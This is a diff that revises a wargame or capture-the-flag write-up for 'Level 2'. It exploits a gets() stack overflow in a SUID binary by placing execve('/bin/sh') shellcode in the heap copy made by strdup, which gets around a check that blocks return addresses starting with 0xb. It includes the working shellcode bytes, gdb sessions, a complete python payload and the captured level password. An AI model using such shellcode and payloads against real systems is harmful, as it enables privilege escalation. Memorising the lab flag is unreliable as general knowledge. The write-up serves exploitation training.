@@ -1,128 +1,86 @@
 # Level 2
 
-Binary: 32-bit ELF, SUID level3, dynamically linked.
+Same recon as level0: SUID **level3**.
 
 ## Analysis
 
-### Ghidra output
-
 ```c
-void main(void) {
-    p();
-    return;
-}
-
 void p(void) {
     uint unaff_retaddr;
     char local_50[76];
-
-    fflush(stdout);
-    gets(local_50);
-    if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
-        printf("(%p)\n", unaff_retaddr);
+    gets(local_50);                                  // no bounds check -> overflow
+    if ((unaff_retaddr & 0xb0000000) == 0xb0000000)  // reject return addr in 0xb...
         _exit(1);
-    }
     puts(local_50);
-    strdup(local_50);
-    return;
+    strdup(local_50);                                // copies our input to the heap
 }
+void main(void) { p(); }
 ```
 
-Two things stand out:
+`gets` has no size limit, so a long input writes past the buffer and overwrites the saved return address (the address the function jumps back to when it ends). But before returning, the code rejects any return address that starts with the hex digit `b`.
 
-1. `gets(local_50)`: buffer overflow, same pattern as level1.
-2. A check on the return address: if its top 4 bits are `0xb`, the program exits.
+> **Why the `0xb` check matters.** ASLR is off, so addresses are fixed. The stack and libc both sit at addresses like `0xbxxxxxxx`. The heap and the program code sit at `0x0804xxxx`. So the check blocks the two usual tricks (running shellcode on the stack, or jumping into libc). An address on the heap still gets through.
 
-### Why 0xb?
-
-On 32-bit Linux with ASLR off:
-- Stack is at `0xbfff xxxx`
-- libc is at `0xb7xx xxxx`
-- Heap is at `0x0804 xxxx` (or similar)
-- Binary code is at `0x0804 xxxx`
-
-So the check blocks ret2libc and jumping to shellcode on the stack. Only heap or binary addresses pass.
-
-### The way out: strdup
-
-`strdup(local_50)` copies the buffer to the heap. If I put shellcode in the buffer, strdup copies it somewhere that passes the 0xb check. I can then overwrite the return address with that heap location.
+`strdup(local_50)` makes a copy of our input on the heap. So the plan is [shellcode injection](../knowledge_base/shellcode_injection.md), but on the heap instead of the stack: put the shellcode at the start of the input, then set the return address to the heap copy.
 
 ## Exploit
 
-### Offset
+### Offset to the return address
 
-Buffer at `ebp - 0x4c` (76 bytes below ebp), saved EBP at ebp, return address at ebp + 4. Total: 80 bytes.
-
-Verifying:
+Buffer is at `ebp-0x4c` (76 bytes below `ebp`), then 4 bytes of saved EBP, so the return address is at offset `76 + 4 = 80`. Confirm with a crash:
 
 ```
 (gdb) run < <(python -c "print('A' * 80 + 'BBBB')")
-Program received signal SIGSEGV, Segmentation fault.
 0x42424242 in ?? ()
 ```
 
-EIP = 0x42424242, so offset 80 is correct.
-
-### Finding the heap address
-
-Breakpoint right after the `strdup` call:
-
-```
-(gdb) b *0x0804853d
-```
-
-strdup returns a pointer in `eax`, so after the breakpoint:
-
-```
-(gdb) r < /tmp/payload
-(gdb) info registers eax
-eax            0x804a008
-```
-
-The heap copy sits at `0x0804a008`.
+EIP = `0x42424242`, so offset **80** is correct.
 
 ### Shellcode
 
-First attempt: the classic 23-byte execve shellcode. It failed. Execution jumped to the heap, ran a few bytes, then segfaulted at offset 64 into the shellcode.
-
-The reason: the 23-byte shellcode doesn't zero `edx`. `edx` becomes the `envp` argument to execve, and if it contains garbage, the kernel returns EFAULT. execve fails, execution continues past the shellcode into 'A' bytes (each 'A' = `inc ecx`, harmless), then hits offset 64 where the code earlier wrote `0x0804a008` (via `mov %eax,-0xc(%ebp)`), and crashes.
-
-Switched to the Aleph One shellcode (45 bytes), originally published in Phrack 49 article 14 (1996, https://phrack.org/issues/49/14) and mirrored on https://fr.wikipedia.org/wiki/Shellcode. It explicitly sets `edx` with `lea edx, [esi+12]`, pointing to a valid NULL. execve works.
+45-byte execve(`/bin/sh`) shellcode ([source](https://fr.wikipedia.org/wiki/Shellcode)):
 
 ```
 \xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
 ```
 
-### Payload
+This shellcode also clears the `edx` register (execve reads it as the environment pointer). If `edx` holds garbage, the `execve` system call fails and no shell starts.
+
+### Layout
+
+The input is `45 + 35 + 4 = 84` bytes:
 
 ```
-45 bytes shellcode + 35 bytes 'A' + 4 bytes heap address + \n
-= 85 bytes total
+[ shellcode 45 ][ padding 35 ][ heap address 4 ]
+ 0..44           45..79         80..83
 ```
 
-The trailing `\n` is critical. Without it, `gets()` keeps reading past the payload (from terminal input via `; cat`), the buffer becomes longer, and `strdup` allocates a different-sized chunk at a different address.
+Padding = `80 - 45 = 35` bytes (fills the gap up to the return address).
+
+### Heap address
+
+`strdup` uses `malloc`, which gives back an address based on the input **size**, not its content. So the heap address stays the same as long as the payload length is fixed. Build a dummy input of the exact final size (84 bytes), stop right after `call strdup` (its return value is in the `eax` register), and read that address:
+
+```
+(gdb) disas p
+   0x08048538 <+...>:  call   <strdup@plt>
+   0x0804853d <+...>:  ...                 <- break here
+(gdb) b *0x0804853d
+(gdb) r < <(python -c 'print "A"*84')
+(gdb) info registers eax
+eax            0x804a008
+```
+
+Heap copy is at `0x0804a008` → little-endian `\x08\xa0\x04\x08`.
+
+### Run
 
 ```bash
-python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "A"*35 + "\x08\xa0\x04\x08"' > /tmp/payload
-```
-
-### Running it
-
-```bash
-$ (cat /tmp/payload; cat) | ./level2
-<puts output of the buffer>
+$ (python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "A"*35 + "\x08\xa0\x04\x08"'; cat) | ./level2
 cat /home/user/level3/.pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```
 
-No shell prompt appears (the spawned shell isn't interactive), so I typed `cat /home/user/level3/.pass` blindly.
+`print` adds a trailing newline so `gets` stops at exactly 84 bytes (otherwise the following `cat` keystrokes extend the buffer, the length changes, and the heap address shifts). `; cat` keeps stdin open for the spawned shell.
 
 Flag: `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`
-
-## Notes
-
-Two problems I hit while building this:
-
-1. **Heap address changes with payload size**. strdup uses malloc, which allocates different bin sizes for different string lengths. When I added a byte here or there, the heap address shifted. Fix: always re-check with the exact payload size.
-
-2. **gets() reading past the payload**. Without a trailing newline, gets waits for EOF. The `; cat` construct feeds terminal input into level2's stdin, so whatever I type gets appended to the buffer. Adding `\n` makes gets stop at a known length.
